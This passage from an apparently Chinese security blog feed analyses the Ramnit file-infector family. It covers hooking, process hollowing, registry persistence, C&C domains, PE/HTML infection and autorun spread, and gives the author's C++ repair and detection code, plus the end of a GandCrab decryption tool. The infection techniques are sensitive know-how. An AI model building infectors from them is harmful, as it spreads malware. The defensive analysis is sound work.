*(LONG64*)encodedNumber; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (ReadFile(hFile, EncodedBuffer, <span class="number">0x100000</span>, &amp;NumberOfBytesRead, <span class="number">0</span>))</span><br><span class="line">&#123;</span><br><span class="line">salsa20Decrypt((BYTE*)EncodedBuffer, NumberOfBytesRead, SalsaKey, SalsaIV, (BYTE*)DecodedBuffer);</span><br><span class="line">DWORD nNumberOfBytesToWrite = NumberOfBytesRead;</span><br><span class="line">DWORD NumberOfBytesWritten;</span><br><span class="line">SetFilePointer(hFile, -(<span class="keyword">int</span>)nNumberOfBytesToWrite, <span class="number">0</span>, FILE_CURRENT);<span class="comment">//将指针设置到刚开始读取的位置</span></span><br><span class="line"><span class="keyword">if</span> (!WriteFile(hFile, DecodedBuffer, nNumberOfBytesToWrite, &amp;NumberOfBytesWritten, <span class="number">0</span>))</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;修复文件：修复文件%s第%d次出错！\n&quot;</span>, filePath, i + <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;修复文件：读取文件%s出错！\n&quot;</span>, filePath);</span><br><span class="line">&#125;</span><br><span class="line">VirtualFree(EncodedBuffer, <span class="number">0</span>, <span class="number">0x8000</span>u);</span><br><span class="line">VirtualFree(DecodedBuffer, <span class="number">0</span>, <span class="number">0x8000</span>u);</span><br><span class="line">SetFilePointer(hFile,<span class="number">-0x21C</span>,<span class="number">0</span>,FILE_END);</span><br><span class="line">SetEndOfFile(hFile);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s文件修复成功!\n&quot;</span>,filePath);</span><br><span class="line">CloseHandle(hFile);</span><br><span class="line">MoveFileExA(filePath, oldFileName, <span class="number">1</span>);<span class="comment">//修复原文件名</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;修复文件：打开文件%s出错！\n&quot;</span>, filePath);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 样本分析报告 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 样本分析报告 </tag>
            
            <tag> 勒索 </tag>
            
            <tag> 修复工具 </tag>
            
            <tag> GandCrab </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ramnit感染病毒分析报告</title>
      <link href="2019/11/10/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/08_Ramnit%E6%84%9F%E6%9F%93%E7%97%85%E6%AF%92/"/>
      <url>2019/11/10/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/08_Ramnit%E6%84%9F%E6%9F%93%E7%97%85%E6%AF%92/</url>
      
        <content type="html"><![CDATA[<center><font size=7><b>Ramnit感染病毒分析报告</b></font></center><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><blockquote><p>本文主要涵盖对Ramnit家族的3个变种（Ramnit.X，Ramnit.AS和Ramnit.A）的分析以及修复方案。其中Ramnit.X变种和Ramnit.AS变种感染文件的方式与之前分析的06—感染型病毒是一样的，所以本文将以Ramnit.A为主要分析对象来进行说明，并会说明Ramnit.A与Ramnit.X变种和Ramnit.AS变种的不同点。由于本文主要是对Ramnit家族的分析与修复方案，将不会特别细致的阐述每一个点，若想看更加详细的分析或想看Ramnit.X变种和Ramnit.AS变种的详细分析，可看Ramnit感染病毒分析报告02。</p></blockquote><h1 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h1><table><thead><tr><th align="center">Ramnit变种名</th><th align="center">感染母体文件</th><th align="center">文件对应MD5</th></tr></thead><tbody><tr><td align="center">Ramnit.A</td><td align="center">WaterMark.exe</td><td align="center">BA4610E9CA3EBF61EC5800955A797C13</td></tr><tr><td align="center">Ramnit.X，AS</td><td align="center">DesktopLayer.exe</td><td align="center">FF5E1F27193CE51EEC318714EF038BEF</td></tr></tbody></table><h1 id="样本详细分析"><a href="#样本详细分析" class="headerlink" title="样本详细分析"></a>样本详细分析</h1><h2 id="病毒主体"><a href="#病毒主体" class="headerlink" title="病毒主体"></a>病毒主体</h2><h3 id="复制自身"><a href="#复制自身" class="headerlink" title="复制自身"></a>复制自身</h3><p>运行病毒样本后，会检索当前文件的路径，并判断该目录是否是<code>C:\Program File\Microsoft\</code>，若不是便将自身复制到该目录下，并执行该目录下的病毒母体文件，然后退出当前进程。代码如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/08_Ramnit%E6%84%9F%E6%9F%93%E7%97%85%E6%AF%92/image-20191123105648286.png" alt="image-20191123105648286"></p><p>Ramnit.A变种与 Ramnit.X，AS 变种的不同点在于释放的感染母体文件不同，Ramnit.A变种释放名为<code>WaterMark.exe</code>， Ramnit.X，AS 变种释放名为 <code>DesktopLayer.exe</code> 。</p><h3 id="inline-Hook"><a href="#inline-Hook" class="headerlink" title="inline Hook"></a>inline Hook</h3><p>先将出主线程外的其他线程挂起，再对ntdll模块中的函数<code>ZwWriteVirtualMemory</code>进行Hook，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/08_Ramnit%E6%84%9F%E6%9F%93%E7%97%85%E6%AF%92/image-20191123111817606.png" alt="image-20191123111817606"></p><p>inline Hook的实现过程，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/08_Ramnit%E6%84%9F%E6%9F%93%E7%97%85%E6%AF%92/image-20191123111231623.png" alt="image-20191123111231623"></p><h3 id="创建傀儡进程"><a href="#创建傀儡进程" class="headerlink" title="创建傀儡进程"></a>创建傀儡进程</h3><p>由于之前Hook了函数<code>ZwWriteVirtualMemory</code>，恶意样本通过调用CreateProcess创建进程时，执行恶意样本自己写的Hookmain函数。</p><p>Hookmain函数主要行为是：往子进程中远程开辟虚拟空间，将PE文件展开并写入远程开辟的虚拟空间中，还写入3了个函数（修复IAT函数，修改区段属性函数，主行为逻辑函数），然后再修改子进程的入口点，从而创建傀儡进程，代码如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/08_Ramnit%E6%84%9F%E6%9F%93%E7%97%85%E6%AF%92/image-20191123112513326.png" alt="image-20191123112513326"></p><p>Ramnit.A变种与 Ramnit.X，AS 变种的不同点</p><p><strong>Ramnit.A变种</strong></p><p>Ramnit.A变种Hook了两次<code>ZwWriteVirtualMemory</code>（分别进行了脱钩），并创建了两个Svchost.exe的傀儡进程，且注入的PE文件不是同一个文件，其中一个为感染傀儡进程，另一个简单看了一下维持进程当互斥体不在时，便遍历进程并注入所有进程。</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/08_Ramnit%E6%84%9F%E6%9F%93%E7%97%85%E6%AF%92/image-20191123115437069.png" alt="image-20191123115437069"></p><p><strong>Ramnit.X，AS 变种</strong></p><p>Ramnit.X，AS 变种只Hook了一次，创建了一个浏览器（IE、Chrome等）傀儡进程。</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/08_Ramnit%E6%84%9F%E6%9F%93%E7%97%85%E6%AF%92/image-20191123115608329.png" alt="image-20191123115608329"></p><h2 id="感染傀儡进程"><a href="#感染傀儡进程" class="headerlink" title="感染傀儡进程"></a>感染傀儡进程</h2><p>Ramnit.A变种创建了两个进程，其中只有一个是进行感染的，并且与Ramnit.X，AS 变种差不太多。</p><p>感染傀儡进程主要行为：</p><ul><li>创建线程1，将感染母体文件（WaterMark.exe或DesktopLayer.exe）添加到注册表Winlogon表中的userinit项中，使其开机自启。</li><li>创建线程2，与google、bing、Yahoo进行连接，获取时间，来记录样本运行了多长时间。</li><li>创建线程3，将线程2中获取的样本运行的时间，记录到文件dmlconf.dat 来记录样本运行了多长时间。</li><li>创建线程4，进行网络通信，按照一定时间，将获取到的数据发送到C&amp;C服务器 ==poopthree.com== 或 ==fget-career.com==。</li><li>感染PE文件和网页文件。</li></ul><p>感染傀儡进程的主要行为代码，如下图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/08_Ramnit%E6%84%9F%E6%9F%93%E7%97%85%E6%AF%92/image-20191123120239592.png" alt="image-20191123120239592"></p><h3 id="添加自启动项"><a href="#添加自启动项" class="headerlink" title="添加自启动项"></a>添加自启动项</h3><p>将感染母体文件（WaterMark.exe或DesktopLayer.exe）添加到注册表Winlogon表中的userinit项中，使其开机自启。代码如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/08_Ramnit%E6%84%9F%E6%9F%93%E7%97%85%E6%AF%92/image-20191123155112622.png" alt="image-20191123155112622"></p><h3 id="加工感染数据"><a href="#加工感染数据" class="headerlink" title="加工感染数据"></a>加工感染数据</h3><p>先读去感染母体的PE文件数据，然后根据函数<code>GetTickCount</code>获取到的自操作系统启动后的时间作为密钥，来加密感染母体PE文件数据，然后在将VBscript与加密后的感染母体PE文件进行拼接。代码如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/08_Ramnit%E6%84%9F%E6%9F%93%E7%97%85%E6%AF%92/image-20191123151951744.png" alt="image-20191123151951744"></p><h3 id="感染固定介质"><a href="#感染固定介质" class="headerlink" title="感染固定介质"></a>感染固定介质</h3><p>遍历固定介质（硬盘），当磁盘大小大于512K时，开始遍历磁盘文件，通过匹配文件后缀名的方式，来判断要感染的文件。Ramnit.X，AS 变种和Ramnit.A变种都只感染4种文件后缀的文件，分别为：==.exe，.dll，.htm，.html==文件，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/08_Ramnit%E6%84%9F%E6%9F%93%E7%97%85%E6%AF%92/image-20191123142516691.png" alt="image-20191123142516691"></p><h4 id="感染PE文件"><a href="#感染PE文件" class="headerlink" title="感染PE文件"></a>感染PE文件</h4><h5 id="判断感染标志"><a href="#判断感染标志" class="headerlink" title="判断感染标志"></a>判断感染标志</h5><p>感染==.exe和.dll==文件，先判断感染标志是否存在。</p><p><code>Ramnit.A变种的感染标记</code>为文件附加数据的最后24个字节，通过将最后24个字节每4个字节与第一个4字节进行异或，然后与特定的值进行比较。将最后24个字节进行异或解密，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/08_Ramnit%E6%84%9F%E6%9F%93%E7%97%85%E6%AF%92/image-20191123143147913.png" alt="image-20191123143147913"></p><p>与特定值进行比较，来判断文件是否被感染，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/08_Ramnit%E6%84%9F%E6%9F%93%E7%97%85%E6%AF%92/image-20191123143208716.png" alt="image-20191123143208716"></p><p><code>Ramnit.X，AS 变种的感染标记</code>，遍历节表，查看文件是否有<code>rmnet</code>节，来判断文件是否被感染。</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/08_Ramnit%E6%84%9F%E6%9F%93%E7%97%85%E6%AF%92/image-20191123143908926.png" alt="image-20191123143908926"></p><h5 id="判断是否感染"><a href="#判断是否感染" class="headerlink" title="判断是否感染"></a>判断是否感染</h5><p>判断目标文件是否是32位程序，是否是.net，是否有签名，当不是32位程序，不是.net，没有签名时，便不感染，代码如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/08_Ramnit%E6%84%9F%E6%9F%93%E7%97%85%E6%AF%92/image-20191123144112278.png" alt="image-20191123144112278"></p><h5 id="遍历目标文件OFTs表"><a href="#遍历目标文件OFTs表" class="headerlink" title="遍历目标文件OFTs表"></a>遍历目标文件OFTs表</h5><p>遍历目标文件的OFts表，获取LoadLibrary和GetProcAddr函数的FTs（IAT）的RVA，以及遍历导入表获取模块名为kernel32.dll的导入表位置，然后将获取到的RVA存到全局变量中，后面会跟着写入函数一同写到被感染文件中，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/08_Ramnit%E6%84%9F%E6%9F%93%E7%97%85%E6%AF%92/image-20191123144750293.png" alt="image-20191123144750293"></p><h5 id="添加新节"><a href="#添加新节" class="headerlink" title="添加新节"></a>添加新节</h5><p>添加新区段，并设置感染区段的可读可写可执行属性，代码如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/08_Ramnit%E6%84%9F%E6%9F%93%E7%97%85%E6%AF%92/image-20191123150704865.png" alt="image-20191123150704865"></p><p><code>Ramnit.A变种</code>添加的区段名为<code>.text</code>。</p><p><code>Ramnit.X，AS 变种</code>添加的区段名为<code>.rmnet</code>。</p><h5 id="修改OEP"><a href="#修改OEP" class="headerlink" title="修改OEP"></a>修改OEP</h5><p>先获取到目标文件的OEP，然后将==添加的新节RVA与OEP的差值存储在全局变量==中，后面会写入被感染的文件中，在将添加的新节的VA设置为新的OEP，代码如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/08_Ramnit%E6%84%9F%E6%9F%93%E7%97%85%E6%AF%92/image-20191123150200713.png" alt="image-20191123150200713"></p><p><code>Ramnit.A变种的OEP</code>存储在感染区段偏移为 ==0x771== 的地址处。</p><p><code>Ramnit.X，AS 变种的OEP</code>存储在感染区段偏移为 ==0x328== 的地址处。</p><h5 id="写入加密后的感染母体及解密函数"><a href="#写入加密后的感染母体及解密函数" class="headerlink" title="写入加密后的感染母体及解密函数"></a>写入加密后的感染母体及解密函数</h5><p>由于之前将感染母体PE进行了加密处理，所以在感染的时候还需要将==解密函数==同==加密后的感染母体文件==同时写入被感染文件中去。下图中进行了两次写入，分别是写入解密函数，和加密后的感染母体文件（WaterMark或DesktopLayer），如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/08_Ramnit%E6%84%9F%E6%9F%93%E7%97%85%E6%AF%92/image-20191123145649043.png" alt="image-20191123145649043"></p><h5 id="写入密钥和感染标志"><a href="#写入密钥和感染标志" class="headerlink" title="写入密钥和感染标志"></a>写入密钥和感染标志</h5><p>这里<code>Ramnit.A变种</code>就与 <code>Ramnit.X，AS 变种</code>不太一样了，<code>Ramnit.X，AS 变种</code>并没有这些操作。</p><p>之前在加工感染数据时提到过，<code>Ramnit.A变种</code>根据获取到的自操作系统启动的时间作为密钥，来加密感染母体PE文件，因此，<code>Ramnit.A变种</code>便将密钥经过加工写入被感染文件的附加数据中，也还会写入<code>Ramnit.A变种</code>的感染标志（文件末尾24字节），代码如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/08_Ramnit%E6%84%9F%E6%9F%93%E7%97%85%E6%AF%92/image-20191123152630234.png" alt="image-20191123152630234"></p><h5 id="修复文件"><a href="#修复文件" class="headerlink" title="修复文件"></a>修复文件</h5><p>修复文件校验和，文件时间以及文件属性，代码如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/08_Ramnit%E6%84%9F%E6%9F%93%E7%97%85%E6%AF%92/image-20191123152742074.png" alt="image-20191123152742074"></p><p><code>Ramnit.A变种</code>会修复文件校验、修改时间和文件属性</p><p><code>Ramnit.X，AS 变种</code>只会修复文件校验和（但好像修复不成功）</p><h4 id="感染网页文件"><a href="#感染网页文件" class="headerlink" title="感染网页文件"></a>感染网页文件</h4><h5 id="判断感染标志-1"><a href="#判断感染标志-1" class="headerlink" title="判断感染标志"></a>判断感染标志</h5><p><code>Ramnit.A变种</code>的网页文件的感染标志与PE文件差不多，唯一区别为PE文件是直接读取最后24字节，而网页文件读取文件末尾倒数第27字节往后的24字节，其他的都一样，代码如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/08_Ramnit%E6%84%9F%E6%9F%93%E7%97%85%E6%AF%92/image-20191123153219238.png" alt="image-20191123153219238"></p><p><code>Ramnit.X，AS 变种</code>的网页感染标志为文件末尾的9个字节是否是<code>&lt;/script&gt;</code></p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/08_Ramnit%E6%84%9F%E6%9F%93%E7%97%85%E6%AF%92/image-20191123153344408.png" alt="image-20191123153344408"></p><h5 id="写入感染脚本"><a href="#写入感染脚本" class="headerlink" title="写入感染脚本"></a>写入感染脚本</h5><p><code>Ramnit.A变种</code>先写入感染脚本，再写入解密感染母体需要的密钥和感染标志，代码如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/08_Ramnit%E6%84%9F%E6%9F%93%E7%97%85%E6%AF%92/image-20191123153834055.png" alt="image-20191123153834055"></p><p><code>Ramnit.X，AS 变种</code>就相对简单，直接写入感染脚本</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/08_Ramnit%E6%84%9F%E6%9F%93%E7%97%85%E6%AF%92/image-20191123153907994.png" alt="image-20191123153907994"></p><h5 id="修复文件-1"><a href="#修复文件-1" class="headerlink" title="修复文件"></a>修复文件</h5><p><code>Ramnit.A变种</code>会修复修改时间和文件属性，代码如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/08_Ramnit%E6%84%9F%E6%9F%93%E7%97%85%E6%AF%92/image-20191123154122711.png" alt="image-20191123154122711"></p><p><code>Ramnit.X，AS 变种</code>对与网页文件并没有任何修复操作。</p><h3 id="感染可移动介质"><a href="#感染可移动介质" class="headerlink" title="感染可移动介质"></a>感染可移动介质</h3><p><code>Ramnit.A变种</code>和<code>Ramnit.X，AS 变种</code>对于可移动介质的感染操作，都是将恶意PE写入可移动介质的==autorun.inf==文件中，使当可移动介质插入计算机时自启动。</p><h1 id="修复分析"><a href="#修复分析" class="headerlink" title="修复分析"></a>修复分析</h1><p><strong>修复目标：</strong></p><ul><li>判断当前操作系统感染类型</li><li>关闭创建的傀儡进程svchost（<code>Ramnit.A变种</code>）和默认浏览器IE，chrome等（<code>Ramnit.X，AS 变种</code>），防止边修复遍感染。</li><li>删除感染母体文件，文件路径为<code>C:\Program File\Microsoft\</code>，目录下的感染母体文件WaterMark（<code>Ramnit.A变种</code>）或是DesktopLayer（<code>Ramnit.X，AS 变种</code>）</li><li>删除自启动项，修改注册表<code>HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon</code></li><li>根据当前感染类型，修复.exe文件、.dll文件、.htm文件、.html文件</li></ul><h2 id="文件修复"><a href="#文件修复" class="headerlink" title="文件修复"></a>文件修复</h2><h3 id="判断文件是否被感染"><a href="#判断文件是否被感染" class="headerlink" title="判断文件是否被感染"></a>判断文件是否被感染</h3><p><code>Ramnit.A变种</code>对于.exe和.dll文件根据文件末尾最后24字节与特定特征去比较，对于.htm和.html文件根据文件倒数第27字节读取到的24字节与特征去比较，本人写的判断<code>Ramnit.A变种</code>是否被感染的代码如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//判断文件末尾的感染特征  返回true，说明该文件被感染</span></span><br><span class="line"><span class="comment">//flag = 0 为PE判断</span></span><br><span class="line"><span class="comment">//flag = 3 为网页判断</span></span><br><span class="line"><span class="function">BOOL <span class="title">JudgeCharacteristic</span><span class="params">(<span class="keyword">char</span> filename[MAX_PATH], <span class="keyword">int</span> flag)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">DWORD Buffer[<span class="number">30</span>];</span><br><span class="line">HANDLE hfile;</span><br><span class="line">DWORD NumberOfBytesRead;</span><br><span class="line">DWORD FileSizeHigh;</span><br><span class="line">DWORD characteristic = <span class="number">0xFA1BC352</span>;</span><br><span class="line">hfile = CreateFileA(filename, GENERIC_READ, FILE_SHARE_READ, <span class="number">0</span>, <span class="number">3u</span>, <span class="number">0x80</span>u, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (hfile != INVALID_HANDLE_VALUE)</span><br><span class="line">&#123;</span><br><span class="line">DWORD filesize = GetFileSize(hfile, &amp;FileSizeHigh);</span><br><span class="line"><span class="keyword">if</span> (filesize &gt; flag + <span class="number">24</span> &amp;&amp; filesize != <span class="number">-1</span> &amp;&amp; !FileSizeHigh)</span><br><span class="line">&#123;</span><br><span class="line">SetFilePointer(hfile, filesize - (flag + <span class="number">0x24</span>), <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">ReadFile(hfile, Buffer, <span class="number">0x24</span>, &amp;NumberOfBytesRead, <span class="number">0</span>);</span><br><span class="line">CloseHandle(hfile);</span><br><span class="line"><span class="keyword">int</span> j = <span class="number">9</span>;</span><br><span class="line"><span class="keyword">for</span> (DWORD i = Buffer[<span class="number">0</span>];; Buffer[j] ^= i)</span><br><span class="line">&#123;</span><br><span class="line">--j;</span><br><span class="line"><span class="keyword">if</span> (!(j * <span class="number">4</span>))</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (Buffer[<span class="number">1</span>] == characteristic &amp;&amp; Buffer[<span class="number">2</span>] == <span class="number">5</span> &amp;&amp; Buffer[<span class="number">3</span>] == <span class="number">0</span> &amp;&amp; Buffer[<span class="number">4</span>] == <span class="number">0x0D</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;<span class="comment">//返回true，说明该文件被感染</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;<span class="comment">//返回false，说明该文件没有被感染，或是不属于该文件类型</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;打开文件失败！&quot;</span>);</span><br><span class="line">CloseHandle(hfile);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;<span class="comment">//文件大小不满足条件，没有被感染</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;<span class="comment">//文件打开失败</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>Ramnit.X，AS 变种</code>的判断逻辑相对简单，对于.exe和.dll文件遍历PE文件的节表，查找是否有.rmnet节，若有便是被感染的，对于.htm和.html文件，则匹配最后9个字节的数据，本人写的代码(没有封装好)如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">对于.exe和.dll文件</span><br><span class="line"><span class="comment">//判断.rmnet节表是否存在 </span></span><br><span class="line"><span class="comment">//返回1，说明rmnet节存在</span></span><br><span class="line"><span class="comment">//返回0，说明rmnet节不存在</span></span><br><span class="line"><span class="function">BOOL <span class="title">JudgeSection</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span>* sectionName = (<span class="keyword">char</span>*)sectionHeader[numOfSection - <span class="number">1</span>].Name;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">strcmp</span>(sectionName, <span class="string">&quot;.rmnet&quot;</span>) == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;<span class="comment">//返回1，说明rmnet节表存在</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;<span class="comment">//返回0，说明节表不存在</span></span><br><span class="line">&#125;</span><br><span class="line">对于.htm和.html文件</span><br><span class="line"> FILE* fp;</span><br><span class="line"><span class="function">BOOL <span class="title">JudgeHtm</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> buffer[<span class="number">15</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">fopen_s(&amp;fp,fileName, <span class="string">&quot;r+&quot;</span>);</span><br><span class="line">fseek(fp, <span class="number">-14</span>, SEEK_END);</span><br><span class="line">fread(buffer, <span class="number">14</span>, <span class="number">1</span>, fp);</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">strcmp</span>(buffer, <span class="string">&quot;//--&gt;&lt;/SCRIPT&gt;&quot;</span>) == <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;<span class="comment">//返回1，说明感染类型为Ramnit.x或Ramnit.AS</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;<span class="comment">//返回3，该文件没有被感染</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="获取原始OEP"><a href="#获取原始OEP" class="headerlink" title="获取原始OEP"></a>获取原始OEP</h3><p>根据<code>Ramnit.A变种的OEP</code>存储在感染区段偏移为 ==0x771== 的地址处。<code>Ramnit.X，AS 变种的OEP</code>存储在感染区段偏移为 ==0x328== 的地址处。</p><p>代码如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span 